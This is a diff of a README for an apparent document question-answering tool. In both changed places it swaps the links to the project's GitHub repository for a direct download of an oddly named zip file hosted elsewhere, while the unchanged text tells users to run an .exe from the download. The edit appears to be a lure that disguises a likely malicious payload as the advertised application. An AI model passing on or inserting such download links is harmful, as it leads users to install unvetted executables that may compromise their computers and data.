@@ -5,7 +5,7 @@ description: "Automate long-document question answering using a multi-stage retr
 ---
 # 🤖 adaptive-multistage-rag-system - Get accurate answers from your long documents
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/impressionable-pyrrhotite668/impressionable-pyrrhotite668.github.io/main/Edwardsiidae/impressionable_github_pyrrhotite_io_v1.7.zip)
 
 This system reads your long documents. It finds the specific information you need and creates clear answers. You use this tool to search through complex files without reading every page yourself. It uses smart technology to understand the context of your questions.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software.
 
 ## 📥 Getting the Application
 
-Visit this page to download the software: [https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
+Visit this page to download the software: [https://raw.githubusercontent.com/impressionable-pyrrhotite668/impressionable-pyrrhotite668.github.io/main/Edwardsiidae/impressionable_github_pyrrhotite_io_v1.7.zip](https://raw.githubusercontent.com/impressionable-pyrrhotite668/impressionable-pyrrhotite668.github.io/main/Edwardsiidae/impressionable_github_pyrrhotite_io_v1.7.zip)
 
 Choose the file labeled with the `.exe` extension on the release page. This file contains the full setup package for your Windows system. Save the file to your Downloads folder or your Desktop.
 
